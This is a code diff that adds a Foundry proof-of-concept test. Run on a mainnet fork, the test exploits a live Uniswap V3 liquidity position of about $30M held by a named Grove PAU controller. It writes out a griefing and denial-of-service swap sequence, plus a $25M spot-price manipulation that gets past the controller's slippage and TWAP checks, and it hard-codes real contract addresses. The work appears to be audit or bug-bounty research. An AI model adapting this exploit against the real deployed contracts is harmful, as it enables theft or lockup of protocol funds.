@@ -2,6 +2,8 @@
 pragma solidity ^0.8.34;
 
 import "./UniswapV3.t.sol";
+import { DssTest }              from "../../lib/dss-test/src/DssTest.sol";
+import { IUniswapV3Controller } from "../../src/facets/uniswap-v3/IUniswapV3Controller.sol";
 
 contract PoC_UniswapV3_SlippageAndTWAPBypassTest is UniswapV3_TestBase {
 
@@ -300,6 +302,145 @@ contract PoC_UniswapV3_SlippageAndTWAPBypassTest is UniswapV3_TestBase {
             honestMin,
             block.timestamp
         );
+    }
+
+}
+
+contract PoC_LiveGrovePAU_30M_Position_Test is DssTest {
+
+    address constant UNISWAP_V3_ROUTER           = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
+    address constant UNISWAP_V3_POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
+    address constant LIVE_GROVE_PAU_CONTROLLER   = 0xbf83F5974B932c7D842254042717D6A2706CE5eE;
+    address constant LIVE_GROVE_PAU_PROXY        = 0x0DcD9298e163dFD3c0B5b00F0d9093C36e40A153;
+    address constant LIVE_GROVE_ALLOCATOR        = 0xdBD17832df0e57b1732cE1C84c652E820e549BAa;
+    address constant LIVE_AUSD_USDC_POOL         = 0xbAFeAd7c60Ea473758ED6c6021505E8BBd7e8E5d;
+    address constant LIVE_AUSD                   = 0x00000000eFE302BEAA2b3e6e1b18d08D69a9012a;
+    address constant LIVE_USDC                   = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    uint256 constant LIVE_TOKEN_ID               = 1352494;
+    uint128 constant LIVE_LIQUIDITY              = 30013312755563770;
+
+    function test_PoC4_liveGrovePAU_30MillionUSD_Position_1352494() public {
+        vm.createSelectFork("https://ethereum-rpc.publicnode.com", 26_300_000);
+
+        // 1. Preview honest withdrawal amounts of the live $30.00M position at Block 26,300,000
+        uint256 snap0 = vm.snapshotState();
+        vm.prank(LIVE_GROVE_PAU_PROXY);
+        (uint256 expectedAusd, uint256 expectedUsdc) = INonfungiblePositionManager(UNISWAP_V3_POSITION_MANAGER)
+            .decreaseLiquidity(
+                INonfungiblePositionManager.DecreaseLiquidityParams({
+                    tokenId    : LIVE_TOKEN_ID,
+                    liquidity  : LIVE_LIQUIDITY,
+                    amount0Min : 0,
+                    amount1Min : 0,
+                    deadline   : block.timestamp
+                })
+            );
+        vm.revertToState(snap0);
+
+        emit log_named_decimal_uint("LIVE GROVE_PAU_PROXY Position #1352494 Unmanipulated AUSD", expectedAusd, 6);
+        emit log_named_decimal_uint("LIVE GROVE_PAU_PROXY Position #1352494 Unmanipulated USDC", expectedUsdc, 6);
+
+        IUniswapV3Facet.TokenAmounts memory honestMin = IUniswapV3Facet.TokenAmounts({
+            amount0: expectedAusd * 999 / 1000,
+            amount1: expectedUsdc * 999 / 1000
+        });
+
+        // 2. Part A (Unprivileged Griefing / DoS Pincer on the live $30.00M Position #1352494):
+        //    Any external user swaps $50,000 USDC -> AUSD (costing $5 in 1bps fee), shifting ~50,000 from AUSD to USDC.
+        address USDC_WHALE = 0x37305B1cD40574E4C5Ce33f8e8306Be057fD7341; // Sky LITE_PSM_USDC_A_POCKET
+        {
+            uint256 snapA = vm.snapshotState();
+            uint256 smallSwapUsdc = 50_000e6;
+            vm.prank(USDC_WHALE);
+            IERC20(LIVE_USDC).transfer(address(this), smallSwapUsdc);
+            IERC20(LIVE_USDC).approve(UNISWAP_V3_ROUTER, smallSwapUsdc);
+            ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
+                ISwapRouter.ExactInputSingleParams({
+                    tokenIn           : LIVE_USDC,
+                    tokenOut          : LIVE_AUSD,
+                    fee               : 100,
+                    recipient         : address(this),
+                    amountIn          : smallSwapUsdc,
+                    amountOutMinimum  : 0,
+                    sqrtPriceLimitX96 : 0
+                })
+            );
+
+            // Pincer Arm 1: 0.1% min tolerance reverts with "Price slippage check"
+            vm.prank(LIVE_GROVE_ALLOCATOR);
+            vm.expectRevert("Price slippage check");
+            IUniswapV3Controller(LIVE_GROVE_PAU_CONTROLLER).uniswapV3_removeLiquidity(
+                LIVE_AUSD_USDC_POOL,
+                LIVE_TOKEN_ID,
+                LIVE_LIQUIDITY,
+                honestMin,
+                block.timestamp
+            );
+
+            // Pincer Arm 2: Widening min tolerance to 0.5% so `decreaseLiquidity` succeeds REVERTS with "UniswapV3Facet/min-amount-below-bound"!
+            IUniswapV3Facet.TokenAmounts memory widerHonestMin = IUniswapV3Facet.TokenAmounts({
+                amount0: expectedAusd * 995 / 1000,
+                amount1: expectedUsdc * 999 / 1000
+            });
+            vm.prank(LIVE_GROVE_ALLOCATOR);
+            vm.expectRevert("UniswapV3Facet/min-amount-below-bound");
+            IUniswapV3Controller(LIVE_GROVE_PAU_CONTROLLER).uniswapV3_removeLiquidity(
+                LIVE_AUSD_USDC_POOL,
+                LIVE_TOKEN_ID,
+                LIVE_LIQUIDITY,
+                widerHonestMin,
+                block.timestamp
+            );
+            vm.revertToState(snapA);
+        }
+
+        // 3. Part B (Spot Manipulation Bypass on the live $30.00M position):
+        {
+            uint256 flashUsdc = 25_000_000e6;
+            vm.prank(USDC_WHALE);
+            IERC20(LIVE_USDC).transfer(address(this), flashUsdc);
+            IERC20(LIVE_USDC).approve(UNISWAP_V3_ROUTER, flashUsdc);
+            ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(
+                ISwapRouter.ExactInputSingleParams({
+                    tokenIn           : LIVE_USDC,
+                    tokenOut          : LIVE_AUSD,
+                    fee               : 100,
+                    recipient         : address(this),
+                    amountIn          : flashUsdc,
+                    amountOutMinimum  : 0,
+                    sqrtPriceLimitX96 : TickMath.getSqrtRatioAtTick(15)
+                })
+            );
+
+            uint256 snapB = vm.snapshotState();
+            vm.prank(LIVE_GROVE_PAU_PROXY);
+            (uint256 manipAusd, uint256 manipUsdc) = INonfungiblePositionManager(UNISWAP_V3_POSITION_MANAGER)
+                .decreaseLiquidity(
+                    INonfungiblePositionManager.DecreaseLiquidityParams({
+                        tokenId    : LIVE_TOKEN_ID,
+                        liquidity  : LIVE_LIQUIDITY,
+                        amount0Min : 0,
+                        amount1Min : 0,
+                        deadline   : block.timestamp
+                    })
+                );
+            vm.revertToState(snapB);
+
+            // Withdraw all $30.00M from the live GROVE_PAU_CONTROLLER at the manipulated spot price (100% USDC, 0 AUSD):
+            vm.prank(LIVE_GROVE_ALLOCATOR);
+            IUniswapV3Facet.TokenAmounts memory withdrawn = IUniswapV3Controller(LIVE_GROVE_PAU_CONTROLLER)
+                .uniswapV3_removeLiquidity(
+                    LIVE_AUSD_USDC_POOL,
+                    LIVE_TOKEN_ID,
+                    LIVE_LIQUIDITY,
+                    IUniswapV3Facet.TokenAmounts({ amount0: manipAusd, amount1: manipUsdc }),
+                    block.timestamp
+                );
+
+            emit log_named_decimal_uint("Withdrawn AUSD at manipulated spot", withdrawn.amount0, 6);
+            emit log_named_decimal_uint("Withdrawn USDC at manipulated spot", withdrawn.amount1, 6);
+            assertEq(withdrawn.amount0, 0, "100% of AUSD converted at manipulated spot despite 0.1% maxSlippage & 600s TWAP");
+        }
     }
 
 }
